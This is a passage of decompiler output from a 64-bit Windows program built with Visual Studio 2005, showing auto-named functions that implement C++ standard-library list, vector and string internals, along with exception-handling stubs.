  FUN_140003750(param_2,*plVar1,param_1);
  return param_2;
}




longlong * FUN_140002f00(longlong param_1,longlong *param_2)

{
  FUN_140003750(param_2,*(longlong *)(param_1 + 8),param_1);
  return param_2;
}




void FUN_140002f30(longlong param_1,undefined1 *param_2)

{
  longlong *plVar1;
  longlong lVar2;
  undefined1 *puVar3;
  longlong local_38 [2];
  undefined1 local_28 [24];
  
  plVar1 = FUN_140002f00(param_1,local_38);
  puVar3 = local_28;
  for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
    *puVar3 = (char)*plVar1;
    plVar1 = (longlong *)((longlong)plVar1 + 1);
    puVar3 = puVar3 + 1;
  }
  FUN_1400031c0(param_1,(longlong)local_28,param_2);
  return;
}




longlong FUN_140002f80(longlong param_1)

{
  undefined1 local_18 [8];
  undefined1 *local_10;
  
  local_10 = local_18;
  FUN_1400031b0(local_10);
  FUN_140003720(param_1);
  FUN_140003590(param_1,0);
  return param_1;
}




void FUN_140002fc0(longlong param_1)

{
  FUN_140003640(param_1);
  return;
}




longlong FUN_140002fe0(longlong param_1)

{
  undefined8 local_18;
  
  if (*(longlong *)(param_1 + 8) == 0) {
    local_18 = 0;
  }
  else {
    local_18 = *(longlong *)(param_1 + 0x10) - *(longlong *)(param_1 + 8) >> 3;
  }
  return local_18;
}




longlong FUN_140003030(longlong param_1,ulonglong param_2)

{
  ulonglong uVar1;
  
  uVar1 = FUN_140002fe0(param_1);
  if (uVar1 <= param_2) {
    FUN_1400073e0();
  }
  return *(longlong *)(param_1 + 8) + param_2 * 8;
}




void FUN_140003070(longlong param_1,undefined8 *param_2)

{
  ulonglong uVar1;
  longlong lVar2;
  longlong *plVar3;
  longlong *plVar4;
  longlong local_58 [2];
  undefined1 local_48 [16];
  longlong local_38 [2];
  ulonglong local_28;
  
  local_28 = FUN_140002fe0(param_1);
  uVar1 = FUN_140003430(param_1);
  if (local_28 < uVar1) {
    lVar2 = FUN_1400036d0(param_1,*(longlong *)(param_1 + 0x10),1,param_2);
    *(longlong *)(param_1 + 0x10) = lVar2;
  }
  else {
    plVar3 = FUN_140003480(param_1,local_58);
    plVar4 = local_38;
    for (lVar2 = 0x10; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(char *)plVar4 = (char)*plVar3;
      plVar3 = (longlong *)((longlong)plVar3 + 1);
      plVar4 = (longlong *)((longlong)plVar4 + 1);
    }
    FUN_1400034b0(param_1,local_48,local_38,param_2);
  }
  return;
}




void FUN_140003130(longlong *param_1)

{
  FUN_140003790(param_1);
  return;
}




longlong * FUN_140003150(longlong *param_1)

{
  FUN_1400037b0(param_1);
  return param_1;
}




bool FUN_140003170(longlong *param_1,longlong *param_2)

{
  bool local_18;
  
  local_18 = FUN_140003820(param_1,param_2);
  local_18 = !local_18;
  return local_18;
}




undefined8 FUN_1400031b0(undefined8 param_1)

{
  return param_1;
}




void FUN_1400031c0(longlong param_1,longlong param_2,undefined1 *param_3)

{
  longlong lVar1;
  undefined8 *puVar2;
  longlong lVar3;
  longlong *plVar4;
  
  lVar1 = FUN_140004c80(param_2);
  puVar2 = (undefined8 *)FUN_140003890(lVar1);
  lVar3 = FUN_140003960(param_1,lVar1,*puVar2,param_3);
  FUN_140003ac0(param_1,1);
  plVar4 = (longlong *)FUN_140003890(lVar1);
  *plVar4 = lVar3;
  puVar2 = (undefined8 *)FUN_140003890(lVar3);
  plVar4 = (longlong *)FUN_1400031b0(*puVar2);
  *plVar4 = lVar3;
  return;
}




longlong FUN_140003250(longlong param_1)

{
  longlong local_30 [3];
  longlong local_18;
  
  local_30[1] = 0xfffffffffffffffe;
  local_30[0] = FUN_140004490(param_1,1);
  local_30[2] = FUN_1400031b0(local_30[0]);
  FUN_1400044b0(param_1 + 1,local_30[2],local_30);
  local_18 = FUN_140003890(local_30[0]);
  FUN_1400044b0(param_1 + 1,local_18,local_30);
  return local_30[0];
}




void Catch_All_1400032f0(undefined8 param_1,longlong param_2)

{
  if (0 < *(int *)(param_2 + 0x20)) {
    FUN_1400031b0(*(undefined8 *)(param_2 + 0x28));
    FUN_140005100();
  }
  FUN_140004b70(*(undefined8 *)(param_2 + 0x60),*(LPVOID *)(param_2 + 0x28));
                    /* WARNING: Subroutine does not return */
  _CxxThrowException((void *)0x0,(ThrowInfo *)0x0);
}




void FUN_140003350(longlong param_1)

{
  FUN_1400038a0(param_1);
  FUN_1400031b0(*(undefined8 *)(param_1 + 8));
  FUN_140005100();
  FUN_140003890(*(longlong *)(param_1 + 8));
  FUN_140005100();
  FUN_140004b70(param_1,*(LPVOID *)(param_1 + 8));
  *(undefined8 *)(param_1 + 8) = 0;
  return;
}




longlong FUN_1400033d0(longlong param_1)

{
  undefined1 local_18 [8];
  undefined1 *local_10;
  
  local_10 = local_18;
  FUN_140004b60(local_10);
  FUN_140004430(param_1);
  FUN_140004b60(param_1 + 2);
  return param_1;
}




longlong FUN_140003430(longlong param_1)

{
  undefined8 local_18;
  
  if (*(longlong *)(param_1 + 8) == 0) {
    local_18 = 0;
  }
  else {
    local_18 = *(longlong *)(param_1 + 0x18) - *(longlong *)(param_1 + 8) >> 3;
  }
  return local_18;
}




longlong * FUN_140003480(longlong param_1,longlong *param_2)

{
  FUN_140004c90(param_2,*(ulonglong *)(param_1 + 0x10),param_1);
  return param_2;
}




undefined1 *
FUN_1400034b0(longlong param_1,undefined1 *param_2,longlong *param_3,undefined8 *param_4)

{
  longlong lVar1;
  longlong *plVar2;
  longlong lVar3;
  undefined1 *puVar4;
  longlong local_60 [2];
  longlong local_50 [3];
  undefined1 local_38 [16];
  longlong local_28;
  
  lVar1 = FUN_140002fe0(param_1);
  if (lVar1 == 0) {
    local_28 = 0;
  }
  else {
    plVar2 = FUN_1400044e0(param_1,local_60);
    local_28 = FUN_140004d60(param_3,plVar2);
  }
  lVar1 = local_28;
  puVar4 = local_38;
  for (lVar3 = 0x10; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = (char)*param_3;
    param_3 = (longlong *)((longlong)param_3 + 1);
    puVar4 = puVar4 + 1;
  }
  FUN_140004560(param_1,(longlong)local_38,1,param_4);
  plVar2 = FUN_1400044e0(param_1,local_50);
  FUN_140004cd0((undefined1 *)plVar2,param_2,lVar1);
  return param_2;
}




ulonglong FUN_140003590(longlong param_1,ulonglong param_2)

{
  ulonglong uVar1;
  longlong lVar2;
  undefined8 uVar3;
  
  *(undefined8 *)(param_1 + 8) = 0;
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined8 *)(param_1 + 0x18) = 0;
  if (param_2 == 0) {
    uVar1 = param_1 & 0xffffffffffffff00;
  }
  else {
    uVar1 = FUN_140004510();
    if (uVar1 < param_2) {
      lVar2 = FUN_140004ae0();
    }
    else {
      uVar3 = FUN_140004ba0(param_1,param_2);
      *(undefined8 *)(param_1 + 8) = uVar3;
      *(undefined8 *)(param_1 + 0x10) = *(undefined8 *)(param_1 + 8);
      lVar2 = *(longlong *)(param_1 + 8) + param_2 * 8;
      *(longlong *)(param_1 + 0x18) = lVar2;
    }
    uVar1 = CONCAT71((int7)((ulonglong)lVar2 >> 8),1);
  }
  return uVar1;
}




void FUN_140003640(longlong param_1)

{
  if (*(longlong *)(param_1 + 8) != 0) {
    FUN_140004530();
    FUN_140004b70(param_1,*(LPVOID *)(param_1 + 8));
  }
  *(undefined8 *)(param_1 + 8) = 0;
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(undefined8 *)(param_1 + 0x18) = 0;
  return;
}




longlong FUN_1400036d0(undefined8 param_1,longlong param_2,longlong param_3,undefined8 *param_4)

{
  FUN_1400053f0(param_2,param_3,param_4);
  return param_2 + param_3 * 8;
}




undefined8 FUN_140003720(undefined8 param_1)

{
  FUN_140004b60(param_1);
  return param_1;
}




longlong * FUN_140003750(longlong *param_1,longlong param_2,longlong param_3)

{
  FUN_140004bc0(param_1,param_2,param_3);
  return param_1;
}




void FUN_140003790(longlong *param_1)

{
  FUN_140004c20(param_1);
  return;
}




longlong * FUN_1400037b0(longlong *param_1)

{
  longlong *plVar1;
  
  if (*param_1 == 0) {
    FUN_1400073e0();
  }
  if (param_1[1] == *(longlong *)(*param_1 + 8)) {
    FUN_1400073e0();
  }
  plVar1 = (longlong *)FUN_1400031b0(param_1[1]);
  param_1[1] = *plVar1;
  return param_1;
}




bool FUN_140003820(longlong *param_1,longlong *param_2)

{
  if ((*param_1 == 0) || (*param_1 != *param_2)) {
    FUN_1400073e0();
  }
  return param_1[1] == param_2[1];
}




longlong FUN_140003890(longlong param_1)

{
  return param_1 + 8;
}




void FUN_1400038a0(longlong param_1)

{
  LPVOID pvVar1;
  undefined8 *puVar2;
  undefined8 local_18;
  
  puVar2 = (undefined8 *)FUN_1400031b0(*(undefined8 *)(param_1 + 8));
  local_18 = (LPVOID)*puVar2;
  puVar2 = (undefined8 *)FUN_1400031b0(*(undefined8 *)(param_1 + 8));
  *puVar2 = *(undefined8 *)(param_1 + 8);
  puVar2 = (undefined8 *)FUN_140003890(*(longlong *)(param_1 + 8));
  *puVar2 = *(undefined8 *)(param_1 + 8);
  *(undefined8 *)(param_1 + 0x10) = 0;
  while (local_18 != *(LPVOID *)(param_1 + 8)) {
    puVar2 = (undefined8 *)FUN_1400031b0(local_18);
    pvVar1 = (LPVOID)*puVar2;
    FUN_140005100();
    FUN_140004b70(param_1,local_18);
    local_18 = pvVar1;
  }
  return;
}




longlong FUN_140003960(longlong param_1,undefined8 param_2,undefined8 param_3,undefined1 *param_4)

{
  longlong lVar1;
  undefined8 uVar2;
  longlong lVar3;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined1 *local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  lVar1 = FUN_140004490(param_1,1);
  uVar2 = FUN_1400031b0(lVar1);
  FUN_1400044b0(param_1 + 1,uVar2,&local_res10);
  lVar3 = FUN_140003890(lVar1);
  FUN_1400044b0(param_1 + 1,lVar3,&local_res18);
  lVar3 = FUN_1400050a0(lVar1);
  FUN_1400050d0(param_1 + 2,lVar3,local_res20);
  return lVar1;
}




void Catch_All_140003a40(undefined8 param_1,longlong param_2)

{
  if (1 < *(int *)(param_2 + 0x20)) {
    FUN_140003890(*(longlong *)(param_2 + 0x28));
    FUN_140005100();
  }
  if (0 < *(int *)(param_2 + 0x20)) {
    FUN_1400031b0(*(undefined8 *)(param_2 + 0x28));
    FUN_140005100();
  }
  FUN_140004b70(*(undefined8 *)(param_2 + 0x60),*(LPVOID *)(param_2 + 0x28));
                    /* WARNING: Subroutine does not return */
  _CxxThrowException((void *)0x0,(ThrowInfo *)0x0);
}




void FUN_140003ac0(longlong param_1,ulonglong param_2)

{
  longlong lVar1;
  undefined8 local_78 [8];
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
  local_38 [40];
  undefined8 local_10;
  
  local_10 = 0xfffffffffffffffe;
  lVar1 = FUN_1400050b0();
  if ((ulonglong)(lVar1 - *(longlong *)(param_1 + 0x10)) < param_2) {
    FUN_140003de0(local_38,"list<T> too long");
    FID_conflict_length_error(local_78,local_38);
                    /* WARNING: Subroutine does not return */
    _CxxThrowException(local_78,(ThrowInfo *)&DAT_140019330);
  }
  *(ulonglong *)(param_1 + 0x10) = *(longlong *)(param_1 + 0x10) + param_2;
  return;
}




void Unwind_140003b70(undefined8 param_1,longlong param_2)

{
  FUN_140003e90((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_2 + 0x60));
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    public: __cdecl std::invalid_argument::invalid_argument(class std::basic_string<char,struct
   std::char_traits<char>,class std::allocator<char> > const & __ptr64) __ptr64
    public: __cdecl std::length_error::length_error(class std::basic_string<char,struct
   std::char_traits<char>,class std::allocator<char> > const & __ptr64) __ptr64
    public: __cdecl std::out_of_range::out_of_range(class std::basic_string<char,struct
   std::char_traits<char>,class std::allocator<char> > const & __ptr64) __ptr64
   
   Library: Visual Studio 2005 Debug */

undefined8 *
FID_conflict_length_error
          (undefined8 *param_1,
          basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
          *param_2)

{
  FID_conflict_logic_error(param_1,param_2);
  *param_1 = std::length_error::vftable;
  return param_1;
}




/* Library Function - Multiple Matches With Different Base Names
    public: __cdecl std::logic_error::logic_error(class std::basic_string<char,struct
   std::char_traits<char>,class std::allocator<char> > const & __ptr64) __ptr64
    public: __cdecl std::runtime_error::runtime_error(class std::basic_string<char,struct
   std::char_traits<char>,class std::allocator<char> > const & __ptr64) __ptr64
   
   Library: Visual Studio 2005 Debug */

undefined8 *
FID_conflict_logic_error
          (undefined8 *param_1,
          basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
          *param_2)

{
  FUN_140007e20(param_1);
  *param_1 = std::logic_error::vftable;
  FUN_140003e40((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_1 + 3),param_2);
  return param_1;
}




void Unwind_140003c30(undefined8 param_1,longlong param_2)

{
  FUN_140007fa0(*(undefined8 **)(param_2 + 0x40));
  return;
}




void FUN_140003c50(longlong param_1)

{
  FUN_140003eb0((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_1 + 0x18));
  return;
}




undefined8 * FUN_140003c70(undefined8 *param_1,uint param_2)

{
  FUN_140003cb0(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




void FUN_140003cb0(undefined8 *param_1)

{
  *param_1 = std::logic_error::vftable;
  FUN_140003e90((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_1 + 3));
  FUN_140007fa0(param_1);
  return;
}




void FUN_140003cf0(undefined8 *param_1)

{
  *param_1 = std::length_error::vftable;
  FUN_140003cb0(param_1);
  return;
}




undefined8 * FUN_140003d20(undefined8 *param_1,uint param_2)

{
  FUN_140003cf0(param_1);
  if ((param_2 & 1) != 0) {
    thunk_FUN_14000b9c0(param_1);
  }
  return param_1;
}




/* Library Function - Multiple Matches With Different Base Names
    public: __cdecl std::logic_error::logic_error(class std::logic_error const & __ptr64) __ptr64
    public: __cdecl std::runtime_error::runtime_error(class std::runtime_error const & __ptr64)
   __ptr64
   
   Library: Visual Studio 2005 Debug */

undefined8 * FID_conflict_runtime_error(undefined8 *param_1,longlong param_2)

{
  FUN_140007ef0(param_1,param_2);
  *param_1 = std::logic_error::vftable;
  FUN_140003e40((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_1 + 3),
                (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *)(param_2 + 0x18));
  return param_1;
}




void Unwind_140003dc0(undefined8 param_1,longlong param_2)

{
  FUN_140007fa0(*(undefined8 **)(param_2 + 0x40));
  return;
}




basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *
FUN_140003de0(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
              *param_1,char *param_2)

{
  undefined1 local_18 [8];
  undefined1 *local_10;
  
  local_10 = local_18;
  FUN_1400031b0(local_10);
  FUN_140003720(param_1);
  FUN_140004040(param_1,'\0',0);
  FID_conflict_assign(param_1,param_2);
  return param_1;
}




basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *
FUN_140003e40(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
              *param_1,
             basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
             *param_2)

{
  FUN_140003720(param_1);
  FUN_140004040(param_1,'\0',0);
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
  assign(param_1,param_2,0,0xffffffffffffffff);
  return param_1;
}




void FUN_140003e90(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                   *param_1)

{
  FUN_140004040(param_1,'\x01',0);
  return;
}




void FUN_140003eb0(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                   *param_1)

{
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
  _Myptr(param_1);
  return;
}




/* Library Function - Single Match
    public: class std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> > & __ptr64 __cdecl std::basic_string<char,struct
   std::char_traits<char>,class std::_DebugHeapAllocator<char> >::assign(class
   std::basic_string<char,struct std::char_traits<char>,class std::_DebugHeapAllocator<char> > const
   & __ptr64,unsigned __int64,unsigned __int64) __ptr64
   
   Library: Visual Studio 2005 Debug */

basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::assign
          (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
           *this,basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 *param_1,__uint64 param_2,__uint64 param_3)

{
  bool bVar1;
  ulonglong uVar2;
  longlong lVar3;
  char *pcVar4;
  char *pcVar5;
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *pbVar6;
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *pbVar7;
  __uint64 _Var8;
  __uint64 _Var9;
  ulonglong local_18;
  
  pbVar6 = param_1;
  pbVar7 = param_1;
  _Var8 = param_2;
  _Var9 = param_3;
  uVar2 = FUN_140003fe0((longlong)param_1);
  if (uVar2 < param_2) {
    FUN_140014a10(pbVar6,pbVar7,_Var8,_Var9);
  }
  lVar3 = FUN_140003fe0((longlong)param_1);
  local_18 = lVar3 - param_2;
  if (param_3 < local_18) {
    local_18 = param_3;
  }
  if (this == param_1) {
    erase(this,param_2 + local_18,0xffffffffffffffff);
    erase(this,0,param_2);
  }
  else {
    bVar1 = FID_conflict__Grow((allocator<char> *)this,local_18,0,_Var9);
    if (bVar1) {
      pcVar4 = _Myptr(param_1);
      pcVar5 = _Myptr(this);
      _Traits_helper::copy_s<struct_std::char_traits<char>_>
                (pcVar5,*(__uint64 *)(this + 0x20),pcVar4 + param_2,local_18);
      _Eos(this,local_18);
    }
  }
  return this;
}




undefined8 FUN_140003fe0(longlong param_1)

{
  return *(undefined8 *)(param_1 + 0x18);
}




/* Library Function - Multiple Matches With Different Base Names
    public: class std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> > & __ptr64 __cdecl std::basic_string<char,struct
   std::char_traits<char>,class std::_DebugHeapAllocator<char> >::assign(char const * __ptr64)
   __ptr64
    public: class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >
   & __ptr64 __cdecl std::basic_string<char,struct std::char_traits<char>,class std::allocator<char>
   >::assign(char const * __ptr64) __ptr64
   
   Library: Visual Studio 2005 Debug */

void FID_conflict_assign(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                         *param_1,char *param_2)

{
  __uint64 _Var1;
  
  _Var1 = FUN_140004020(param_2);
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
  assign(param_1,param_2,_Var1);
  return;
}




void FUN_140004020(char *param_1)

{
  strlen(param_1);
  return;
}




void FUN_140004040(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                   *param_1,char param_2,__uint64 param_3)

{
  char *pcVar1;
  
  if ((param_2 != '\0') && (0xf < *(ulonglong *)(param_1 + 0x20))) {
    pcVar1 = *(char **)(param_1 + 8);
    if (param_3 != 0) {
      std::_Traits_helper::copy_s<struct_std::char_traits<char>_>
                ((char *)(param_1 + 8),0x10,pcVar1,param_3);
    }
    FUN_140004b70(param_1,pcVar1);
  }
  *(undefined8 *)(param_1 + 0x20) = 0xf;
  std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::_Eos
            (param_1,param_3);
  return;
}




/* Library Function - Single Match
    public: class std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> > & __ptr64 __cdecl std::basic_string<char,struct
   std::char_traits<char>,class std::_DebugHeapAllocator<char> >::assign(char const *
   __ptr64,unsigned __int64) __ptr64
   
   Library: Visual Studio 2005 Debug */

basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::assign
          (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
           *this,char *param_1,__uint64 param_2)

{
  bool bVar1;
  ulonglong uVar2;
  char *pcVar3;
  undefined8 in_R9;
  
  uVar2 = FUN_140005050(this,param_1);
  if ((uVar2 & 0xff) == 0) {
    bVar1 = FID_conflict__Grow((allocator<char> *)this,param_2,0,in_R9);
    if (bVar1) {
      pcVar3 = _Myptr(this);
      _Traits_helper::copy_s<struct_std::char_traits<char>_>
                (pcVar3,*(__uint64 *)(this + 0x20),param_1,param_2);
      _Eos(this,param_2);
    }
  }
  else {
    pcVar3 = _Myptr(this);
    this = assign(this,this,(longlong)param_1 - (longlong)pcVar3,param_2);
  }
  return this;
}




/* Library Function - Single Match
    public: class std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> > & __ptr64 __cdecl std::basic_string<char,struct
   std::char_traits<char>,class std::_DebugHeapAllocator<char> >::erase(unsigned __int64,unsigned
   __int64) __ptr64
   
   Library: Visual Studio 2005 Debug */

basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::erase
          (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
           *this,__uint64 param_1,__uint64 param_2)

{
  longlong lVar1;
  longlong lVar2;
  char *pcVar3;
  char *pcVar4;
  undefined8 in_R9;
  __uint64 local_res18;
  
  if (*(ulonglong *)(this + 0x18) < param_1) {
    FUN_140014a10(param_1,param_1,param_2,in_R9);
  }
  local_res18 = param_2;
  if (*(longlong *)(this + 0x18) - param_1 < param_2) {
    local_res18 = *(longlong *)(this + 0x18) - param_1;
  }
  if (local_res18 != 0) {
    lVar1 = *(longlong *)(this + 0x18);
    pcVar3 = _Myptr(this);
    lVar2 = *(longlong *)(this + 0x20);
    pcVar4 = _Myptr(this);
    _Traits_helper::move_s<struct_std::char_traits<char>_>
              (pcVar4 + param_1,lVar2 - param_1,pcVar3 + local_res18 + param_1,
               (lVar1 - param_1) - local_res18);
    _Eos(this,*(longlong *)(this + 0x18) - local_res18);
  }
  return this;
}




/* Library Function - Single Match
    protected: void __cdecl std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> >::_Eos(unsigned __int64) __ptr64
   
   Library: Visual Studio 2005 Debug */

void __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::_Eos
          (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
           *this,__uint64 param_1)

{
  char *pcVar1;
  undefined1 local_18 [24];
  
  local_18[0] = 0;
  *(__uint64 *)(this + 0x18) = param_1;
  pcVar1 = _Myptr(this);
  FUN_1400042f0(pcVar1 + param_1,local_18);
  return;
}




void FUN_1400042f0(undefined1 *param_1,undefined1 *param_2)

{
  *param_1 = *param_2;
  return;
}




/* Library Function - Multiple Matches With Different Base Names
    protected: bool __cdecl std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> >::_Grow(unsigned __int64,bool) __ptr64
    protected: bool __cdecl std::basic_string<char,struct std::char_traits<char>,class
   std::allocator<char> >::_Grow(unsigned __int64,bool) __ptr64
   
   Library: Visual Studio 2005 Debug */

bool FID_conflict__Grow(allocator<char> *param_1,ulonglong param_2,undefined8 param_3,
                       undefined8 param_4)

{
  ulonglong uVar1;
  allocator<char> *paVar2;
  ulonglong uVar3;
  char cVar4;
  __uint64 local_18;
  
  cVar4 = (char)param_3;
  paVar2 = param_1;
  uVar3 = param_2;
  uVar1 = FUN_140004df0(param_1);
  if (uVar1 < param_2) {
    FUN_140014940(paVar2,uVar3,param_3,param_4);
  }
  if (*(ulonglong *)(param_1 + 0x20) < param_2) {
    FUN_140004e40(param_1,param_2,*(__uint64 *)(param_1 + 0x18));
  }
  else if ((cVar4 == '\0') || (0xf < param_2)) {
    if (param_2 == 0) {
      std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::
      _Eos((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *
           )param_1,0);
    }
  }
  else {
    local_18 = param_2;
    if (*(ulonglong *)(param_1 + 0x18) <= param_2) {
      local_18 = *(__uint64 *)(param_1 + 0x18);
    }
    FUN_140004040((basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                   *)param_1,'\x01',local_18);
  }
  return param_2 != 0;
}




/* Library Function - Single Match
    protected: char * __ptr64 __cdecl std::basic_string<char,struct std::char_traits<char>,class
   std::_DebugHeapAllocator<char> >::_Myptr(void) __ptr64
   
   Library: Visual Studio 2005 Debug */

char * __thiscall
std::basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>::_Myptr
          (basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
           *this)

{
  basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_> *local_18;
  
  if (*(ulonglong *)(this + 0x20) < 0x10) {
    local_18 = this + 8;
  }
  else {
    local_18 = *(basic_string<char,struct_std::char_traits<char>,class_std::_DebugHeapAllocator<char>_>
                 **)(this + 8);
  }
  return (char *)local_18;
}




longlong FUN_140004430(longlong param_1)

{
  undefined1 local_18 [8];
  undefined1 *local_10;
  
  local_10 = local_18;
  FUN_140004b60(local_10);
  FUN_140003720(param_1);
  FUN_140004b60(param_1 + 1);
  return param_1;
}




void FUN_140004490(undefined8 param_1,ulonglong param_2)

{
  FUN_1400054b0(param_2);
  return;
}




void FUN_1400044b0(undefined8 param_1,undefined8 param_2,undefined8 *param_3)

{
  FUN_1400055d0(param_2,param_3);
  return;
}




longlong * FUN_1400044e0(longlong param_1,longlong *param_2)

{
  FUN_140004c90(param_2,*(ulonglong *)(param_1 + 8),param_1);
  return param_2;
}




void FUN_140004510(void)

{
  max_size();
  return;
}




void FUN_140004530(void)

{
  FUN_140005650();
  return;
}




void FUN_140004560(longlong param_1,longlong param_2,ulonglong param_3,undefined8 *param_4)

{
  longlong lVar1;
  undefined8 uVar2;
  undefined8 local_68;
  ulonglong local_60;
  void *local_58;
  void *local_50;
  longlong local_48;
  undefined8 local_40;
  longlong local_38;
  ulonglong local_30;
  ulonglong local_28;
  longlong local_20;
  void *local_18;
  
  local_40 = 0xfffffffffffffffe;
  local_68 = *param_4;
  local_60 = FUN_140003430(param_1);
  if (param_3 != 0) {
    local_38 = FUN_140002fe0(param_1);
    lVar1 = FUN_140004510();
    if ((ulonglong)(lVar1 - local_38) < param_3) {
      FUN_140004ae0();
    }
    else {
      lVar1 = FUN_140002fe0(param_1);
      if (local_60 < lVar1 + param_3) {
        local_30 = local_60 / 2;
        lVar1 = FUN_140004510();
        if (lVar1 - local_30 < local_60) {
          local_28 = 0;
        }
        else {
          local_28 = local_60 + local_60 / 2;
        }
        local_60 = local_28;
        lVar1 = FUN_140002fe0(param_1);
        if (local_60 < lVar1 + param_3) {
          lVar1 = FUN_140002fe0(param_1);
          local_60 = lVar1 + param_3;
        }
        local_58 = (void *)FUN_140004ba0(param_1,local_60);
        local_50 = local_58;
        local_58 = (void *)FUN_1400056a0(param_1,*(undefined8 *)(param_1 + 8),
                                         *(undefined8 *)(param_2 + 8),local_58);
        local_20 = (longlong)local_58;
        local_58 = (void *)FUN_1400036d0(param_1,(longlong)local_58,param_3,&local_68);
        local_18 = local_58;
        FUN_1400056a0(param_1,*(undefined8 *)(param_2 + 8),*(undefined8 *)(param_1 + 0x10),local_58)
        ;
        lVar1 = FUN_140002fe0(param_1);
        if (*(longlong *)(param_1 + 8) != 0) {
          FUN_140004530();
          FUN_140004b70(param_1,*(LPVOID *)(param_1 + 8));
        }
        *(void **)(param_1 + 0x18) = (void *)((longlong)local_50 + local_60 * 8);
        *(void **)(param_1 + 0x10) = (void *)((longlong)local_50 + (param_3 + lVar1) * 8);
        *(void **)(param_1 + 8) = local_50;
      }
      else if ((ulonglong)(*(longlong *)(param_1 + 0x10) - *(longlong *)(param_2 + 8) >> 3) <
               param_3) {
        FUN_1400056a0(param_1,*(undefined8 *)(param_2 + 8),*(undefined8 *)(param_1 + 0x10),
                      (void *)(*(longlong *)(param_2 + 8) + param_3 * 8));
        FUN_1400036d0(param_1,*(longlong *)(param_1 + 0x10),
                      param_3 - (*(longlong *)(param_1 + 0x10) - *(longlong *)(param_2 + 8) >> 3),
                      &local_68);
        *(ulonglong *)(param_1 + 0x10) = *(longlong *)(param_1 + 0x10) + param_3 * 8;
        FUN_1400056e0(*(undefined8 *)(param_2 + 8),*(longlong *)(param_1 + 0x10) + param_3 * -8,
                      &local_68);
      }
      else {
        local_48 = *(longlong *)(param_1 + 0x10);
        uVar2 = FUN_1400056a0(param_1,local_48 + param_3 * -8,local_48,*(void **)(param_1 + 0x10));
        *(undefined8 *)(param_1 + 0x10) = uVar2;
        FUN_140005730(*(undefined8 *)(param_2 + 8),local_48 + param_3 * -8,local_48);
